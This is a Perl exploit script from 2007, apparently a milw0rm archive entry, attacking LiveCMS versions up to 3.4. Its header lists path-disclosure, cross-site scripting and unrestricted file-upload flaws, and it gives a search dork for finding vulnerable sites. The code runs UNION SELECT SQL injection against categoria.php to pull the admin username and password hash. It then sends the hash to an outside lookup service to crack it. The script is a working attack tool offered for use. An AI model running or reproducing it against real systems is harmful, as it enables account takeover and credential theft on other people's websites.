#!/usr/bin/perl
##############################################################################################
#         ___   ___                         _
#        / _ \ / _ \                       | |
#   __ _| | | | | | |_ __  ___   _ __   ___| |_
#  / _` | | | | | | | '_ \/ __| | '_ \ / _ \ __|
# | (_| | |_| | |_| | | | \__ \_| | | |  __/ |_
#  \__, |\___/ \___/|_| |_|___(_)_| |_|\___|\__|
#   __/ |
#  |___/
###############################################################################################
#INFO:
#Program Title ################################################################################
#LiveCMS <= 3.4 SQL Injection, Absolute Path Disclosure, XSS Injection, Arbitrary File Upload
#
#Description ##################################################################################
#This is a free CMS system.
#
#Script Download ##############################################################################
#http://sourceforge.net/project/downloading.php?group_id=78735&use_mirror=ufpr&filename=livecms-3.4.tar.gz&12060460
#http://livecms.com
#
#Original Advisory #############################################################################
#http://www.g00ns-forum.net/showthread.php?t=9350
#
#Exploit #######################################################################################
#credz to Vipsta and Clorox for vulnerability
#[c]ode by TrinTiTTY (2007) www.g00ns.net
#shoutz: z3r0, milf, blackhill, godxcel, murderskillz, katalyst, SyNiCaL, OD, pr0be, rezen, str0ke,
#fish, rey, canuck, c0ma, sick, trin, a59, seven, fury, <S>, Bernard, and everyone else at g00ns.net
#
#Details #######################################################################################                              
#APD: The absolute path is disclosed in a mysql error when categoria.php's paramater cid is queried with a non-defined
#variable. example: categoria.php?cid='
#XSS: Article names are not properly santised, a user could insert malicious javascript
#AFU: Articles can have a small image that is uploaded with them, however LiveCMS fails to restrict what file types
#can be uploaded.  A user could upload a malicious script with this method and compromise the server.
#GoogleDork: "powered by livecms"
#
################################################################################################
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#                LiveCMS <= 3.3  [ categoria.php ]               #
#                    ] Remote SQL Injection [                    #
#                                                                #
#              [c]ode by TrinTiTTY [at] g00ns.net                #
#              Vulnerability by Vipsta and Clorox                #
#                                                                #
#                                                                #
#  [irc.g00ns.net]       [www.g00ns.net]        [ts.g00ns.net]   #
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#

use LWP;

$host = @ARGV[0];
$ua = LWP::UserAgent->new;

my $uject ='categoria.php?cid=1%20UNION%20ALL%20SELECT%201,2,user,4,5,6%20FROM%20live_admin%20WHERE%20userid=1/*';
my $pject ='categoria.php?cid=1%20UNION%20ALL%20SELECT%201,2,pass,4,5,6%20FROM%20live_admin%20WHERE%20userid=1/*';

if (@ARGV < 1){&top( );&usage( )}
elsif ($host =~ /http:\/\//){print"\n\n [-] Don't use http:// in host\n";exit( 0 );}
else { &getUser( ) }



sub getUser( ) {
  system("color 4");
  &top( );
  print "\n [~] Retrieving admin username\n";
  $nameres = $ua->get("http://$host/$uject");

  $namecon = $nameres->content;

  if ($namecon =~ /<td>(.*)a href=\"(.*)\"(.*)>(.*)<\/a><\/td>/gmi)
  {
     $user = $4;
     print "\n [+] Admin user retrieved: $user\n";
     print "\n [~] Retrieving password for $user\n";
     getPass( )
  }
  else {
      print "\n [-] Unable to retrieve admin username\n";
      print "\n [~] Retrieving password\n";
      getPass( )
  }
}

sub getPass( ) {

  $passres = $ua->get("http://$host/$pject");

  $passCon = $passres->content;

  if ($passCon =~ /<td>(.*)a href=\"(.*)\"(.*)>([a-f0-9]{32})<\/a><\/td>/gmi)
  {
     $pass = $4;
     print "\n [+] Admin password retrieved: $pass\n";
     &resolveHash($pass);
     system("color 7");
  }
  else {
      print "\n [-] Unable to retrieve admin password\n";
      system("color 7");
      exit(0);
  }
}

sub resolveHash($)
{
  print "\n [~] Attempting to resolve hash\n";
  $hashget = LWP::UserAgent->new;  #thx gdata
  $resp = $hashget->get("http://gdataonline.com/qkhash.php?mode=txt&hash=$_[0]"); # checks gdata for hash
  $hashans = $resp->content;
  if ($hashans =~ m\width="35%"><b>([  -_a-z0-9.*?&=;<>/""]{1,25})</b></td>\){
     $crack = $1;
     print "\n [+] Password hash resolved: $crack\n";
     system("color 7");
     exit(0);
  }
  else {
     print "\n [-] Couldn't resolve hash\n";
     system("color 7");
     exit(0);
  }
}
sub top( )
{
  print q {
  ##################################################################
  #                LiveCMS <= 3.3  [ categoria.php ]               #
  #                    ] Remote SQL Injection [                    #
  #                                                                #
  #                [c]ode by TrinTiTTY [at] g00ns.net              #
  #                Vulnerability by Vipsta and Clorox              #
  ##################################################################
  }
}
sub usage( )
{
  print "\n Usage: perl livecms33.pl <host>\n";
  print "\n Example: perl livecms33.pl www.example.com/path\n\n";
  exit(0);
}

# milw0rm.com [2007-06-20]
